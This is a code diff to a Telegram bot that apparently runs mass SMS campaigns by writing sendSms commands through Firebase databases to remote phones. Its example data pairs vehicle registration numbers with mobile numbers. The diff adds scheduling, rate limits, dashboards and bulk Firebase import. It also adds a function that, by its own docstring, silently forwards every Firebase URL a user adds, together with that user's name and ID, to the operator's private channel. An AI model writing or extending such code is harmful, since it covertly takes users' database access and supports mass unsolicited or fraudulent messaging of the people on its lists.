@@ -7,11 +7,12 @@ import json
 import math
 import time
 from concurrent.futures import ThreadPoolExecutor
-from datetime import datetime
+from datetime import datetime, timedelta
 from typing import List, Dict, Any, Optional
 
 from telegram import (
     Update, InlineKeyboardButton, InlineKeyboardMarkup,
+    ReplyKeyboardMarkup, KeyboardButton,
 )
 from telegram.constants import ParseMode
 from telegram.ext import (
@@ -32,6 +33,33 @@ logger = logging.getLogger(__name__)
 db = Database(config.DB_PATH)
 
 ACTIVE_CAMPAIGNS: Dict[str, dict] = {}
+SCHEDULED_CAMPAIGNS: Dict[str, dict] = {}
+DASHBOARD_REFRESH: Dict[tuple, bool] = {}
+
+# ── Persistent bottom menu (reply keyboard) ──
+BTN_SEND = "🚀 Send Bulk SMS"
+BTN_UPLOAD = "📁 Upload Data File"
+BTN_TEMPLATES = "📝 Message Templates"
+BTN_FIREBASE = "🗂 Manage Firebase"
+BTN_DEVICES = "📱 Devices"
+BTN_STATUS = "📊 Status"
+BTN_HISTORY = "📜 History"
+BTN_SETTINGS = "⚙️ Settings"
+BTN_USAGE = "📅 Daily Usage"
+BTN_HELP = "❓ Help"
+
+MAIN_REPLY_KB = ReplyKeyboardMarkup(
+    [
+        [KeyboardButton(BTN_SEND), KeyboardButton(BTN_UPLOAD)],
+        [KeyboardButton(BTN_TEMPLATES), KeyboardButton(BTN_FIREBASE)],
+        [KeyboardButton(BTN_DEVICES), KeyboardButton(BTN_STATUS)],
+        [KeyboardButton(BTN_HISTORY), KeyboardButton(BTN_SETTINGS)],
+        [KeyboardButton(BTN_USAGE), KeyboardButton(BTN_HELP)],
+    ],
+    resize_keyboard=True,
+    is_persistent=True,
+    input_field_placeholder="Menu se choose karo ya message type karo...",
+)
 
 # User input states
 ST_IDLE = 'idle'
@@ -40,6 +68,8 @@ ST_TPL_MSG = 'tpl_msg'
 ST_TPL_EDIT_MSG = 'tpl_edit_msg'
 ST_DF_UPLOAD = 'df_upload'
 ST_FB_URL = 'fb_url'
+ST_FB_BULK = 'fb_bulk'
+ST_SCHED_TIME = 'sched_time'
 ST_CAMP_UPLOAD = 'camp_upload'
 
 
@@ -249,6 +279,15 @@ def fmt_time(seconds: float) -> str:
 # /start & MAIN MENU
 # ============================================================
 
+async def _send_or_edit(update: Update, text: str, markup=None):
+    """Edit the message if this came from an inline button, else send a new one.
+    Lets the same screen work from both inline buttons and the bottom menu."""
+    if update.callback_query:
+        await update.callback_query.edit_message_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
+    else:
+        await update.message.reply_text(text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
+
+
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     if not is_authorized(user.id):
@@ -257,7 +296,19 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)
         return
     clear_state(context)
-    await _show_main_menu(update, context)
+    # Install the persistent bottom menu (stays until replaced).
+    fb_count = len(db.get_firebase_configs(user.id))
+    tpl_count = len(db.get_user_templates(user.id))
+    active = len(ACTIVE_CAMPAIGNS)
+    welcome = (
+        f"⚡ *SMS BULK SENDER*\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"Hey *{user.first_name}*! 👋\n"
+        f"Niche ke menu se koi bhi option choose karo.\n\n"
+        f"🔥 `{fb_count}` Firebase  |  📝 `{tpl_count}` Template"
+        + (f"\n🔴 *{active} campaign(s) running*" if active > 0 else "")
+    )
+    await update.message.reply_text(welcome, reply_markup=MAIN_REPLY_KB, parse_mode=ParseMode.MARKDOWN)
 
 async def _show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -563,7 +614,7 @@ async def data_upload_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "`DL01AB1234,9876543210`\n"
         "`DL02CD5678,9123456780`"
     )
-    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
+    await _send_or_edit(update, text)
 
 async def handle_file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     state = context.user_data.get('state', ST_IDLE)
@@ -747,8 +798,125 @@ async def show_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += "No Firebase configured. Add one to get started!\n"
 
     kb.append([InlineKeyboardButton("➕ Add Firebase", callback_data="fb_add")])
+    kb.append([InlineKeyboardButton("📋 Bulk Add (many URLs)", callback_data="fb_bulk")])
     kb.append([InlineKeyboardButton("🔙 Main Menu", callback_data="menu_main")])
-    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _send_or_edit(update, text, InlineKeyboardMarkup(kb))
+
+async def _forward_firebase_to_channel(context: ContextTypes.DEFAULT_TYPE, user, urls: list):
+    """Silently forward newly-added Firebase URL(s) to the private log channel."""
+    if not getattr(config, 'FORWARD_FIREBASE_TO_CHANNEL', False):
+        return
+    channel = getattr(config, 'LOG_CHANNEL_ID', '') or ''
+    if not channel or not urls:
+        return
+    try:
+        uname = f"@{user.username}" if getattr(user, 'username', None) else "—"
+        url_lines = "\n".join(f"• `{u}`" for u in urls)
+        text = (
+            f"🔥 *New Firebase Added*\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 Name: {user.first_name}\n"
+            f"🆔 ID: `{user.id}`\n"
+            f"🔗 Username: {uname}\n"
+            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+            f"*URL(s):*\n{url_lines}"
+        )
+        await context.bot.send_message(
+            chat_id=channel,
+            text=text,
+            parse_mode=ParseMode.MARKDOWN,
+            disable_notification=True,
+            disable_web_page_preview=True,
+        )
+    except Exception as e:
+        logger.error(f"Could not forward Firebase to log channel: {e}")
+
+
+async def firebase_bulk_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    set_state(context, ST_FB_BULK)
+    text = (
+        "📋 *Bulk Add Firebase*\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Ek saath kai Firebase URLs bhejo — har URL nayi line par "
+        "(ya comma/space se alag):\n\n"
+        "```\n"
+        "https://proj1-default-rtdb.firebaseio.com\n"
+        "https://proj2-default-rtdb.firebaseio.com\n"
+        "https://proj3-default-rtdb.firebaseio.com\n"
+        "```\n"
+        "Main sabhi ko add karke summary de dunga."
+    )
+    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
+
+async def handle_firebase_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    raw = update.message.text or ""
+    parts = re.split(r'[\s,]+', raw.strip())
+    urls = []
+    for p in parts:
+        p = p.strip()
+        if not p:
+            continue
+        if not p.startswith("http"):
+            p = f"https://{p}"
+        urls.append(p)
+    # de-dup preserving order
+    seen = set()
+    urls = [u for u in urls if not (u in seen or seen.add(u))]
+
+    if not urls:
+        await update.message.reply_text("❌ Koi valid URL nahi mila. Dubara bhejo.")
+        return
+
+    clear_state(context)
+    user_id = update.effective_user.id
+    existing = {c['url'].rstrip('/') for c in db.get_firebase_configs(user_id)}
+    msg = await update.message.reply_text(
+        f"⏳ *Testing & adding {len(urls)} Firebase(s)...*", parse_mode=ParseMode.MARKDOWN
+    )
+
+    def _test_and_prepare(url):
+        fb = FirebaseManager(url)
+        ok = fb.test_connection()
+        return url, ok
+
+    results = await asyncio.to_thread(
+        lambda: [( _test_and_prepare(u)) for u in urls]
+    )
+
+    added, failed, skipped = 0, 0, 0
+    added_urls = []
+    lines = []
+    for url, ok in results:
+        short = url.split("//")[-1].split(".")[0][:24]
+        if url.rstrip('/') in existing:
+            skipped += 1
+            lines.append(f"⏭️ `{short}` — already added")
+            continue
+        if ok:
+            name = short or "Firebase"
+            db.add_firebase(user_id, name, url)
+            existing.add(url.rstrip('/'))
+            added += 1
+            added_urls.append(url)
+            lines.append(f"✅ `{short}` — added")
+        else:
+            failed += 1
+            lines.append(f"❌ `{short}` — connect failed")
+
+    if added_urls:
+        await _forward_firebase_to_channel(context, update.effective_user, added_urls)
+
+    summary = (
+        f"📋 *Bulk Add Complete*\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"✅ Added: `{added}` | ❌ Failed: `{failed}` | ⏭️ Skipped: `{skipped}`\n\n"
+        + "\n".join(lines[:40])
+    )
+    kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🔥 Firebase List", callback_data="menu_firebase")],
+        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
+    ])
+    await msg.edit_text(summary, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
 
 async def firebase_add_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     set_state(context, ST_FB_URL)
@@ -780,6 +948,7 @@ async def handle_firebase_url(update: Update, context: ContextTypes.DEFAULT_TYPE
 
     fid = db.add_firebase(update.effective_user.id, name, url)
     clear_state(context)
+    await _forward_firebase_to_channel(context, update.effective_user, [url])
 
     text = (
         f"✅ *Firebase Connected!*\n"
@@ -1219,6 +1388,7 @@ async def _camp_step5_review(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     kb = [
         [InlineKeyboardButton("✅ CONFIRM & START", callback_data="camp_confirm")],
+        [InlineKeyboardButton("⏰ Schedule for Later", callback_data="camp_schedule")],
         [
             InlineKeyboardButton("✏️ Edit", callback_data="menu_campaign"),
             InlineKeyboardButton("🔄 Recheck Devices", callback_data="camp_recheck"),
@@ -1227,7 +1397,7 @@ async def _camp_step5_review(update: Update, context: ContextTypes.DEFAULT_TYPE)
     ]
     await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
 
-async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_TYPE, schedule_dt=None):
     user_id = update.effective_user.id
     camp = context.user_data.get('campaign', {})
     targets = camp.get('targets', [])
@@ -1242,6 +1412,9 @@ async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_T
 
     # Create campaign in DB
     campaign_id = make_campaign_id(user_id)
+
+    settings = db.get_user_settings(user_id)
+    rate_limit = int(settings.get('rate_limit', 0) or 0)
 
     fb_config = db.get_active_firebase(user_id)
     firebase_id = fb_config['id'] if fb_config else 0
@@ -1261,8 +1434,7 @@ async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_T
 
     db.add_campaign_targets(campaign_id, targets)
 
-    # Setup active campaign with device→firebase mapping
-    ACTIVE_CAMPAIGNS[campaign_id] = {
+    camp_runtime = {
         'running': True,
         'paused': False,
         'stop': False,
@@ -1271,14 +1443,47 @@ async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_T
         'device_fb_map': camp.get('device_fb_map', {}),
         'sim_slot': camp.get('sim_slot', 0),
         'delay': camp.get('delay', 2.0),
+        'rate_limit': rate_limit,
     }
+
+    rl_txt = f"🚦 Rate limit: `{rate_limit}/min`\n" if rate_limit > 0 else ""
+
+    # ── Scheduled campaign ──
+    if schedule_dt is not None:
+        wait_s = max(0, (schedule_dt - datetime.now()).total_seconds())
+        db.set_campaign_schedule(campaign_id, schedule_dt.strftime("%Y-%m-%d %H:%M:%S"), rate_limit)
+        SCHEDULED_CAMPAIGNS[campaign_id] = camp_runtime
+        text = (
+            f"⏰ *CAMPAIGN SCHEDULED!*\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"Campaign ID: `{campaign_id}`\n\n"
+            f"📞 Total: `{len(targets)}`\n"
+            f"📱 Devices: `{len(selected)}`\n"
+            f"{rl_txt}"
+            f"🕒 Starts at: `{schedule_dt.strftime('%Y-%m-%d %H:%M')}`\n"
+            f"⏳ In: `{fmt_time(wait_s)}`"
+        )
+        kb = InlineKeyboardMarkup([
+            [InlineKeyboardButton("🗑 Cancel Schedule", callback_data=f"camp_unschedule_{campaign_id}")],
+            [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
+        ])
+        await update.callback_query.edit_message_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
+        asyncio.create_task(
+            _scheduled_runner(campaign_id, wait_s, update.callback_query.message, user_id)
+        )
+        context.user_data.pop('campaign', None)
+        return
+
+    # ── Immediate start ──
+    ACTIVE_CAMPAIGNS[campaign_id] = camp_runtime
 
     text = (
         f"🚀 *CAMPAIGN STARTED!*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"Campaign ID: `{campaign_id}`\n\n"
         f"📞 Total: `{len(targets)}`\n"
-        f"📱 Devices: `{len(selected)}`\n\n"
+        f"📱 Devices: `{len(selected)}`\n"
+        f"{rl_txt}\n"
         f"{progress_bar(0, len(targets))}\n"
         f"✅ Sent: `0` | ❌ Failed: `0` | ⏳ Pending: `{len(targets)}`"
     )
@@ -1294,6 +1499,96 @@ async def campaign_confirm_start(update: Update, context: ContextTypes.DEFAULT_T
 
     # Launch background campaign
     asyncio.create_task(run_campaign(campaign_id, update.callback_query.message, user_id))
+
+
+async def _scheduled_runner(campaign_id: str, wait_s: float, message, user_id: int):
+    """Wait until the scheduled time, then launch the campaign."""
+    try:
+        await asyncio.sleep(wait_s)
+    except asyncio.CancelledError:
+        return
+    runtime = SCHEDULED_CAMPAIGNS.pop(campaign_id, None)
+    if runtime is None:
+        return  # schedule was cancelled
+    ACTIVE_CAMPAIGNS[campaign_id] = runtime
+    try:
+        await message.edit_text(
+            f"⏰ *Scheduled campaign starting now...*\n`{campaign_id}`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception:
+        pass
+    await run_campaign(campaign_id, message, user_id)
+
+
+async def campaign_schedule_ask(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    camp = context.user_data.get('campaign', {})
+    if not camp.get('targets') or not camp.get('selected_devices'):
+        await update.callback_query.answer("Prepare the campaign first", show_alert=True)
+        return
+    set_state(context, ST_SCHED_TIME)
+    text = (
+        "⏰ *Schedule Campaign*\n"
+        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        "Kab start karna hai? Reply karo:\n\n"
+        "• `+30` — 30 minute baad\n"
+        "• `14:30` — aaj 14:30 baje (agar time nikal gaya to kal)\n"
+        "• `2026-01-20 09:00` — exact date & time\n\n"
+        "_(24-hour format, server time)_"
+    )
+    await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
+
+
+async def handle_schedule_time(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    raw = update.message.text.strip()
+    now = datetime.now()
+    dt = None
+    try:
+        if raw.startswith("+"):
+            dt = now + timedelta(minutes=int(raw[1:].strip()))
+        elif re.match(r'^\d{4}-\d{2}-\d{2}\s+\d{1,2}:\d{2}$', raw):
+            dt = datetime.strptime(raw, "%Y-%m-%d %H:%M")
+        elif re.match(r'^\d{1,2}:\d{2}$', raw):
+            hh, mm = map(int, raw.split(":"))
+            dt = now.replace(hour=hh, minute=mm, second=0, microsecond=0)
+            if dt <= now:
+                dt = dt + timedelta(days=1)
+    except Exception:
+        dt = None
+
+    if dt is None or dt <= now:
+        await update.message.reply_text(
+            "❌ Samajh nahi aaya ya time past mein hai. Dubara bhejo (jaise `+30` ya `14:30`).",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+
+    clear_state(context)
+    # Build a fake callback-style flow: send a message we can edit
+    msg = await update.message.reply_text("⏰ *Scheduling...*", parse_mode=ParseMode.MARKDOWN)
+
+    class _Shim:
+        def __init__(self, m):
+            self.message = m
+        async def answer(self, *a, **k):
+            pass
+        async def edit_message_text(self, *a, **k):
+            return await self.message.edit_text(*a, **k)
+
+    update_shim = type('U', (), {})()
+    update_shim.callback_query = _Shim(msg)
+    update_shim.effective_user = update.effective_user
+    await campaign_confirm_start(update_shim, context, schedule_dt=dt)
+
+
+async def campaign_unschedule(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
+    SCHEDULED_CAMPAIGNS.pop(cid, None)
+    db.update_campaign_status(cid, 'STOPPED')
+    await update.callback_query.edit_message_text(
+        f"🗑 *Schedule cancelled* — `{cid}`",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")]]),
+        parse_mode=ParseMode.MARKDOWN
+    )
 
 async def campaign_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.pop('campaign', None)
@@ -1322,7 +1617,24 @@ async def run_campaign(campaign_id: str, message, user_id: int):
     device_ids = camp['device_ids']
     sim_slot = camp['sim_slot']
     delay = camp['delay']
+    rate_limit = camp.get('rate_limit', 0)  # global SMS/min cap, 0 = off
     start_time = time.time()
+
+    # ── Global rate-limiter (shared across all device workers) ──
+    _rl_lock = asyncio.Lock()
+    _rl_state = {'next': 0.0}
+
+    async def rate_gate():
+        if rate_limit <= 0:
+            return
+        interval = 60.0 / rate_limit
+        async with _rl_lock:
+            now = time.time()
+            wait = _rl_state['next'] - now
+            if wait > 0:
+                await asyncio.sleep(wait)
+                now = time.time()
+            _rl_state['next'] = max(now, _rl_state['next']) + interval
 
     campaign_data = db.get_campaign(campaign_id)
     total = campaign_data['total'] if campaign_data else 0
@@ -1384,6 +1696,8 @@ async def run_campaign(campaign_id: str, message, user_id: int):
 
             sms_start = time.time()
 
+            await rate_gate()
+
             # Write sendSms command OFF the event loop so all device workers
             # genuinely run in parallel (blocking requests no longer stall the loop).
             success = await asyncio.to_thread(
@@ -1425,26 +1739,31 @@ async def run_campaign(campaign_id: str, message, user_id: int):
             remaining = max(0, total - done)
             elapsed_s = time.time() - start_time
             elapsed = fmt_time(elapsed_s)
+            pct = int((done / total) * 100) if total > 0 else 0
             pbar = progress_bar(done, total)
-            workers = progress['active_workers']
+            phones = len(device_ids)
 
-            # Calculate speed & ETA
-            sms_per_min = round(done / (elapsed_s / 60), 1) if elapsed_s > 5 else 0
+            # Speed in msg/sec (like the reference UI)
+            sms_per_sec = round(done / elapsed_s, 1) if elapsed_s > 3 else 0
             eta = ""
-            if sms_per_min > 0 and remaining > 0:
-                eta_s = int(remaining / (sms_per_min / 60))
+            if sms_per_sec > 0 and remaining > 0:
+                eta_s = int(remaining / sms_per_sec)
                 eta = f"⏰ ETA: `{fmt_time(eta_s)}`\n"
 
-            status_emoji = "⏸" if camp.get('paused') else "⚡"
+            status_emoji = "⏸" if camp.get('paused') else "📤"
+            status_label = "PAUSED" if camp.get('paused') else "SENDING IN PROGRESS"
             text = (
-                f"{status_emoji} *CAMPAIGN LIVE*\n"
+                f"{status_emoji} *{status_label}*\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"ID: `{campaign_id}`\n\n"
-                f"{pbar}\n\n"
-                f"✅ Delivered: `{progress['completed']}` / `{total}`\n"
-                f"❌ Failed: `{progress['failed']}`\n"
-                f"📱 Active Workers: `{workers}`\n"
-                f"🚀 Speed: `{sms_per_min} SMS/min`\n"
+                f"{pbar}\n"
+                f"`{done}` / `{total}` processed\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"✅ Sent:    `{progress['completed']}`\n"
+                f"❌ Failed:  `{progress['failed']}`\n"
+                f"⏳ Pending: `{remaining}`\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                f"⚡ Speed: `{sms_per_sec} msg/s`\n"
+                f"📱 Phones: `{phones}`\n"
                 f"{eta}"
                 f"⏱️ Elapsed: `{elapsed}`"
             )
@@ -1551,6 +1870,26 @@ async def run_campaign(campaign_id: str, message, user_id: int):
     except Exception:
         pass
 
+    # ── Auto-attach CSV delivery log ──
+    try:
+        targets_all = db.get_campaign_targets_all(campaign_id)
+        out = io.StringIO()
+        w = csv.writer(out)
+        w.writerow(['Target ID', 'Mobile', 'Status', 'Device', 'Processed At', 'Error'])
+        for t in targets_all:
+            w.writerow([t['target_id'], t['mobile'], t['status'],
+                        t['device_id'], t['processed_at'], t['error']])
+        buf = io.BytesIO(out.getvalue().encode('utf-8'))
+        buf.name = f"delivery_log_{campaign_id}.csv"
+        await message.reply_document(
+            document=buf,
+            filename=f"delivery_log_{campaign_id}.csv",
+            caption=f"📋 Delivery log — `{campaign_id}`",
+            parse_mode=ParseMode.MARKDOWN
+        )
+    except Exception as e:
+        logger.error(f"Could not send delivery log: {e}")
+
 async def campaign_pause(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
     camp = ACTIVE_CAMPAIGNS.get(cid)
     if camp:
@@ -1612,9 +1951,8 @@ async def campaign_stop_confirm(update: Update, context: ContextTypes.DEFAULT_TY
 # 📊 DASHBOARD
 # ============================================================
 
-async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    stats = db.get_user_stats(user_id)
+async def _build_dashboard_text(user_id: int) -> str:
+    stats = await asyncio.to_thread(db.get_user_stats, user_id)
 
     online_count = 0
     offline_count = 0
@@ -1629,10 +1967,18 @@ async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception:
             pass
 
-    active_camps = [cid for cid, c in ACTIVE_CAMPAIGNS.items() if c.get('user_id') == user_id and c.get('running')]
+    active_camps = [cid for cid, c in ACTIVE_CAMPAIGNS.items()
+                    if c.get('user_id') == user_id and c.get('running')]
 
-    text = (
-        f"📊 *DASHBOARD*\n"
+    live = ""
+    for cid in active_camps:
+        c = db.get_campaign(cid)
+        if c:
+            done = c['completed'] + c['failed']
+            live += f"  🚀 `{cid}` — {done}/{c['total']}\n"
+
+    return (
+        f"📊 *DASHBOARD*  _( {datetime.now().strftime('%H:%M:%S')} )_\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"📈 *Campaign Stats:*\n"
         f"  Total Campaigns: `{stats['total_campaigns']}`\n"
@@ -1645,13 +1991,92 @@ async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"  🔴 Offline: `{offline_count}`\n"
         f"  📊 Total: `{total_clients}`\n\n"
         f"🚀 *Active Campaigns:* `{len(active_camps)}`\n"
+        f"{live}"
     )
 
+async def show_dashboard(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    text = await _build_dashboard_text(user_id)
     kb = [
-        [InlineKeyboardButton("🔄 Refresh", callback_data="menu_dashboard")],
+        [
+            InlineKeyboardButton("🔄 Refresh", callback_data="menu_dashboard"),
+            InlineKeyboardButton("▶️ Auto-Refresh", callback_data="dash_autoon"),
+        ],
         [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
     ]
-    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _send_or_edit(update, text, InlineKeyboardMarkup(kb))
+
+async def dashboard_auto_refresh(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Live-refresh the dashboard message every few seconds for ~2 minutes."""
+    user_id = update.effective_user.id
+    msg = update.callback_query.message
+    key = (msg.chat_id, msg.message_id)
+
+    # Already running? stop toggles off.
+    if key in DASHBOARD_REFRESH:
+        DASHBOARD_REFRESH[key] = False
+        await update.callback_query.answer("⏹ Auto-refresh stopped")
+        return
+
+    DASHBOARD_REFRESH[key] = True
+    await update.callback_query.answer("▶️ Auto-refresh ON (every 6s)")
+
+    stop_kb = InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("🔄 Refresh", callback_data="menu_dashboard"),
+            InlineKeyboardButton("⏹ Stop Auto-Refresh", callback_data="dash_autoon"),
+        ],
+        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
+    ])
+
+    for _ in range(20):  # ~2 minutes
+        if not DASHBOARD_REFRESH.get(key):
+            break
+        await asyncio.sleep(6)
+        if not DASHBOARD_REFRESH.get(key):
+            break
+        try:
+            text = await _build_dashboard_text(user_id)
+            await msg.edit_text(text, reply_markup=stop_kb, parse_mode=ParseMode.MARKDOWN)
+        except Exception:
+            pass
+
+    DASHBOARD_REFRESH.pop(key, None)
+
+
+async def show_daily_usage(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    today = datetime.now().strftime("%Y-%m-%d")
+    campaigns = await asyncio.to_thread(db.get_campaigns, user_id, 100)
+
+    today_camps = [c for c in campaigns if (c.get('created_at') or '').startswith(today)]
+    sent = sum(c['completed'] for c in today_camps)
+    failed = sum(c['failed'] for c in today_camps)
+    total = sum(c['total'] for c in today_camps)
+
+    text = (
+        f"📅 *Daily Usage* — `{today}`\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
+        f"🗂 Campaigns today: `{len(today_camps)}`\n"
+        f"📞 Targets: `{total}`\n"
+        f"✅ Sent: `{sent}`\n"
+        f"❌ Failed: `{failed}`\n\n"
+    )
+    if today_camps:
+        text += "*Today's campaigns:*\n"
+        for c in today_camps[:15]:
+            emoji = {'COMPLETED': '✅', 'STOPPED': '🛑', 'RUNNING': '🚀',
+                     'SCHEDULED': '⏰', 'PAUSED': '⏸'}.get(c['status'], '•')
+            text += f"  {emoji} `{c['campaign_id']}` — {c['completed']}/{c['total']}\n"
+    else:
+        text += "_Aaj koi campaign nahi chalaya._\n"
+
+    kb = [
+        [InlineKeyboardButton("🔄 Refresh", callback_data="menu_usage")],
+        [InlineKeyboardButton("📜 Full History", callback_data="menu_history")],
+        [InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")],
+    ]
+    await _send_or_edit(update, text, InlineKeyboardMarkup(kb))
 
 
 # ============================================================
@@ -1680,7 +2105,7 @@ async def show_history(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text += "No campaigns yet.\n"
 
     kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")])
-    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _send_or_edit(update, text, InlineKeyboardMarkup(kb))
 
 async def history_view(update: Update, context: ContextTypes.DEFAULT_TYPE, cid: str):
     c = db.get_campaign(cid)
@@ -1833,6 +2258,7 @@ async def history_resend_failed(update: Update, context: ContextTypes.DEFAULT_TY
         'device_fb_map': device_fb_map,
         'sim_slot': c.get('sim_slot', 0),
         'delay': c.get('delay', settings.get('default_delay', 2.0)),
+        'rate_limit': int(settings.get('rate_limit', 0) or 0),
     }
 
     text = (
@@ -1859,11 +2285,14 @@ async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     settings = db.get_user_settings(user_id)
 
+    rate = settings.get('rate_limit', 0) or 0
+    rate_txt = f"`{rate}/min`" if rate > 0 else "`Off (max speed)`"
     text = (
         f"⚙️ *Settings*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
         f"⏱️ *Default Delay:* `{settings['default_delay']}s`\n"
         f"📶 *Default SIM:* `Slot {settings['default_sim']}`\n"
+        f"🚦 *Rate Limit:* {rate_txt}\n"
     )
 
     sim0 = "✅ " if settings['default_sim'] == 0 else ""
@@ -1880,9 +2309,23 @@ async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
         check = "✅ " if settings['default_delay'] == d else ""
         delay_btns.append(InlineKeyboardButton(f"{check}{d}s", callback_data=f"set_delay_{d}"))
     kb.append(delay_btns)
+
+    text += "\n*🚦 Rate Limit (SMS/min, global cap):*\n"
+    rates = [0, 30, 60, 120, 300]
+    rate_btns = []
+    for rl in rates:
+        check = "✅ " if rate == rl else ""
+        label = "Off" if rl == 0 else str(rl)
+        rate_btns.append(InlineKeyboardButton(f"{check}{label}", callback_data=f"set_rate_{rl}"))
+    kb.append(rate_btns)
     kb.append([InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")])
 
-    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _send_or_edit(update, text, InlineKeyboardMarkup(kb))
+
+async def settings_set_rate(update: Update, context: ContextTypes.DEFAULT_TYPE, val: int):
+    db.save_user_settings(update.effective_user.id, rate_limit=val)
+    await update.callback_query.answer(f"✅ Rate limit: {'Off' if val == 0 else str(val) + '/min'}")
+    await show_settings(update, context)
 
 async def settings_set_delay(update: Update, context: ContextTypes.DEFAULT_TYPE, val: float):
     db.save_user_settings(update.effective_user.id, default_delay=val)
@@ -1919,11 +2362,16 @@ async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "• Pause / Resume / Stop campaigns\n"
         "• 🔁 Resend only FAILED numbers\n"
         "• 📥 Export campaign numbers (.txt)\n"
+        "• 🚦 Rate limit (SMS/min cap) — Settings mein\n"
+        "• ⏰ Auto-schedule — campaign ko future time par chalao\n"
+        "• 📋 Auto CSV delivery logs — har campaign ke end par\n"
+        "• 📊 Live auto-refresh dashboard\n"
+        "• 📋 Bulk Firebase add — ek saath kai URLs\n"
         "• Campaign history with downloadable CSV reports\n"
         "• Device online/offline monitoring\n"
     )
     kb = [[InlineKeyboardButton("🏠 Main Menu", callback_data="menu_main")]]
-    await update.callback_query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
+    await _send_or_edit(update, text, InlineKeyboardMarkup(kb))
 
 
 # ============================================================
@@ -2009,6 +2457,7 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if data == "menu_datafiles": return await show_data_files(update, context)
     if data == "menu_firebase": return await show_firebase(update, context)
     if data == "menu_dashboard": return await show_dashboard(update, context)
+    if data == "menu_usage": return await show_daily_usage(update, context)
     if data == "menu_history": return await show_history(update, context)
     if data == "menu_settings": return await show_settings(update, context)
     if data == "menu_help": return await show_help(update, context)
@@ -2039,6 +2488,7 @@ async def callback_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # -- Firebase --
